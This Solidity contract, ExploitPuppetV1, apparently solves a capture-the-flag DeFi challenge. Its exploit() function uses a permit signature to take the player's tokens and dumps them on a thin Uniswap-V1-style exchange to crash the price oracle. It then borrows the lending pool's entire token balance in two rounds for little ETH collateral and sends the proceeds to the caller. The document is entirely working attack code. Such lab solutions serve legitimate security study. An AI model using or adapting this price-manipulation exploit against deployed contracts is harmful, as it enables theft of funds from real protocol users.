// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface TokenV1 {

    function approve(address recipient, uint256 amount) external;
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function nonces(address target) external view returns (uint256);
    function balanceOf(address) external returns (uint256);
}

interface ExchangeV1 {

    function getTokenToEthInputPrice(uint256 amount) external returns (uint256);
    function tokenToEthSwapInput(uint256 token, uint256 eth, uint256 deadline) external;
    function getEthToTokenInputPrice(uint256 amount) external returns (uint256);
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable;
}

interface PoolV1 {
    function calculateDepositRequired(uint256 amount) external returns (uint256);
    function borrow(uint256 amount, address recipient) payable external;
}

error GenError(address);

contract ExploitPuppetV1 {

    address token;
    address pool;
    address exchange;

    uint constant PLAYER_INITIAL_TOKEN_BALANCE = 1000 ether; // ether used for decimal 10n ** 18n

    constructor(address _token, address _pool, address _exchange) {
        token = _token;
        pool = _pool;
        exchange = _exchange;
    }

    function exploit(uint256 deadline, uint8 v, bytes32 r, bytes32 s) external payable {

        TokenV1(token).permit(msg.sender, address(this), type(uint256).max, deadline, v, r, s);
        TokenV1(token).transferFrom(msg.sender, address(this), PLAYER_INITIAL_TOKEN_BALANCE);
        TokenV1(token).approve(exchange, type(uint256).max);

        // Round 1 swap
        uint256 ethPrice = ExchangeV1(exchange).getTokenToEthInputPrice(PLAYER_INITIAL_TOKEN_BALANCE);
        ExchangeV1(exchange).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, ethPrice, deadline);

        // First loan
        uint256 poolBalance = TokenV1(token).balanceOf(pool);
        uint256 firstLoan = poolBalance / 2;
        uint256 collateral = PoolV1(pool).calculateDepositRequired(firstLoan);

        PoolV1(pool).borrow{value: collateral}(firstLoan, address(this));

        // Round 2 swap
        ethPrice = ExchangeV1(exchange).getTokenToEthInputPrice(firstLoan);
        ExchangeV1(exchange).tokenToEthSwapInput(firstLoan, ethPrice, deadline);

        // Final loan
        poolBalance = TokenV1(token).balanceOf(pool);
        collateral = PoolV1(pool).calculateDepositRequired(poolBalance);

        PoolV1(pool).borrow{value: collateral}(poolBalance, address(this));

        uint256 tokenPrice = ExchangeV1(exchange).getEthToTokenInputPrice(msg.value);
        ExchangeV1(exchange).ethToTokenSwapInput{value: msg.value}(tokenPrice, deadline);

        TokenV1(token).transfer(msg.sender, TokenV1(token).balanceOf(address(this)));
    }

    function getPermitHash(
        address owner,
        address spender,
        uint256 deadline
        ) public view returns (bytes32) {

        unchecked {
            bytes32 result = keccak256(
                    abi.encodePacked(
                        "\x19\x01",
                        TokenV1(token).DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                keccak256(
                                    "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
                                ),
                                owner,
                                spender,
                                type(uint256).max,
                                TokenV1(token).nonces(owner),
                                deadline
                            )
                        )
                    )
                );
        
        return result;

        }
    }

    receive() payable external {}
}